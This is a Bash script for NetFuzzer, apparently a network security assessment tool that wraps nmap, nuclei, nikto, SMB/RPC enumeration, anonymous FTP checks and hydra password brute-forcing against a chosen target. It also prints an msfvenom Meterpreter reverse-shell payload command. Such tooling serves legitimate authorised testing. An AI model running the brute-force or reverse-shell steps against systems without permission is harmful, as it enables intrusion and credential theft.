#!/bin/bash

# ANSI color codes
RED='\033[91m'
RESET='\033[0m'

# ASCII art
echo -e "${RED}"
cat << "EOF"

                       __  ____                         
           ____  ___  / /_/ __/_  __________  ___  _____
          / __ \/ _ \/ __/ /_/ / / /_  /_  / / _ \/ ___/
         / / / /  __/ /_/ __/ /_/ / /_/ /_/  __/ /    
        /_/ /_/\___/\__/_/  \__,_/ /___/___/\___/_/   v1.3.0
        
                                       Made by Satya Prakash (0xKayala)                 

EOF
echo -e "${RESET}"

# Help menu
display_help() {
    cat << EOF
NetFuzzer is a comprehensive network security assessment tool for internal/external networks including firewalls, routers, switches, Active Directory, SMBs, etc.

Usage: $0 [options]

Options:
  -h, --help              Display help information
  -t, --target <target>   Target IP address, range, or hostname
  -f, --filename <file>   File containing a list of targets (one per line)
  -s, --scan <scan_type>  Specify the type of scan to run:
                          1.  live_hosts       - Discover live hosts
                          2.  reverse_dns      - Perform reverse DNS lookup
                          3.  port_scan        - Scan ports and detect versions
                          4.  os_detection     - Detect OS
                          5.  traceroute       - Perform traceroute
                          6.  ssl_enum         - Perform SSL enumeration
                          7.  smb_enum         - Perform SMB enumeration
                          8.  rpc_enum         - Perform RPC enumeration
                          9.  vuln_scan        - Perform vulnerability scan
                         10.  nuclei_scan      - Perform Nuclei scan
                         11.  brute_force      - Perform brute-forcing (SSH/HTTP)
                         12.  ftp_enum         - Check FTP anonymous login
                         13.  enum4linux       - Deep Windows SMB/AD enumeration
                         14.  nbtscan          - NetBIOS hostname/IP discovery
                         15.  nikto_scan       - Web server vulnerability scan
                         16.  msf_stub         - Metasploit module reference
EOF
    exit 0
}

# Dependency Checker
check_dependencies() {
    dependencies=("nuclei" "httpx" "nmap" "smbclient" "rpcclient" "go" "git" "enum4linux-ng" "nbtscan" "nikto" "hydra")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo "Installing $dep..."
            case $dep in
                nuclei|httpx)
                    go install -v github.com/projectdiscovery/$dep/cmd/$dep@latest
                    ;;
                nmap|hydra|nikto|nbtscan)
                    sudo apt-get update && sudo apt-get install -y "$dep"
                    ;;
                smbclient|rpcclient)
                    sudo apt-get install -y smbclient
                    ;;
                go)
                    sudo apt-get install -y golang
                    ;;
                git)
                    sudo apt-get install -y git
                    ;;
                enum4linux-ng)
                    git clone https://github.com/cddmp/enum4linux-ng.git ~/enum4linux-ng && sudo ln -s ~/enum4linux-ng/enum4linux-ng.py /usr/local/bin/enum4linux-ng
                    ;;
            esac
        fi
    done

    local nuclei_dir="$HOME/nuclei-templates"
    if [ ! -d "$nuclei_dir" ]; then
        echo "Cloning Nuclei templates..."
        git clone https://github.com/projectdiscovery/nuclei-templates.git "$nuclei_dir"
    fi
}

# Initialize script
check_dependencies

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        -h|--help)
            display_help
            ;;
        -t|--target)
            target="$2"
            shift; shift
            ;;
        -f|--filename)
            filename="$2"
            shift; shift
            ;;
        -s|--scan)
            scan_type="$2"
            shift; shift
            ;;
        *)
            echo "Unknown option: $key"
            display_help
            ;;
    esac
done

# Argument validation
if [ -z "$target" ] && [ -z "$filename" ]; then
    echo "Error: You must provide a target (-t) or a filename (-f)."
    display_help
fi

if [ -z "$scan_type" ]; then
    echo "Error: You must specify a scan type (-s)."
    display_help
fi

# Define scan types
declare -A scans=(
    [1]="live_hosts"
    [2]="reverse_dns"
    [3]="port_scan"
    [4]="os_detection"
    [5]="traceroute"
    [6]="ssl_enum"
    [7]="smb_enum"
    [8]="rpc_enum"
    [9]="vuln_scan"
    [10]="nuclei_scan"
    [11]="brute_force"
    [12]="ftp_enum"
    [13]="enum4linux"
    [14]="nbtscan"
    [15]="nikto_scan"
    [16]="msf_stub"
)

scan_name=${scans[$scan_type]}
if [ -z "$scan_name" ]; then
    echo "Error: Invalid scan type."
    display_help
fi

mkdir -p NetFuzzer-Results/"$scan_name"
timestamp=$(date +%F_%T | tr ':' '_')

run_scan() {
    local target_input=$1
    local output_file="NetFuzzer-Results/${scan_name}/${target_input//[:\//]/_}_$timestamp.txt"

    case $scan_name in
        live_hosts)
            nmap -sn "$target_input" -oN "$output_file"
            ;;
        reverse_dns)
            nmap -R -sL "$target_input" -oN "$output_file"
            ;;
        port_scan)
            nmap -Pn -sC -sV -T4 -A -O -p- "$target_input" -oN "$output_file"
            ;;
        os_detection)
            nmap -O "$target_input" -oN "$output_file"
            ;;
        traceroute)
            nmap --traceroute "$target_input" -oN "$output_file"
            ;;
        ssl_enum)
            sudo nmap -Pn -sV --script ssl-enum-ciphers -p 443 "$target_input" -oN "$output_file"
            ;;
        smb_enum)
            smbclient -L "\\$target_input\\" > "$output_file" 2>&1
            ;;
        rpc_enum)
            rpcclient -U "" -N "$target_input" > "$output_file" 2>&1
            ;;
        vuln_scan)
            sudo nmap -Pn --script vuln -sV "$target_input" -oN "$output_file"
            ;;
        nuclei_scan)
            nuclei -u "$target_input" -t "$HOME/nuclei-templates" -es info -rl 5 -o "$output_file"
            ;;
        brute_force)
            if [ ! -f "users.txt" ]; then
                echo "Downloading users.txt..."
                curl -sSL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -o users.txt
            fi
            if [ ! -f "passwords.txt" ]; then
                echo "Downloading passwords.txt..."
                curl -sSL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt -o passwords.txt
            fi
            hydra -L users.txt -P passwords.txt -t 4 "$target_input" > "$output_file"
            ;;
        ftp_enum)
            echo "user anonymous anonymous" | timeout 10 ftp -inv "$target_input" > "$output_file" 2>/dev/null || echo "FTP connection failed." > "$output_file"
            ;;
        enum4linux)
            enum4linux-ng "$target_input" | tee "$output_file"
            ;;
        nbtscan)
            nbtscan -v "$target_input" > "$output_file"
            ;;
        nikto_scan)
            nikto -h "$target_input" -output "$output_file"
            ;;
        msf_stub)
            echo -e "use auxiliary/scanner/smb/smb_login\nset RHOSTS $target_input\nrun" > "$output_file"
            echo -e "\n# Example msfvenom payload command:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe > shell.exe" >> "$output_file"
            ;;
    esac

    echo "Results saved to $output_file"
}

# Main execution
if [ -n "$target" ]; then
    run_scan "$target"
elif [ -n "$filename" ]; then
    while IFS= read -r line; do
        run_scan "$line"
    done < <(sort -u "$filename")
fi

echo "Network Security Assessment completed. Happy Scanning!"
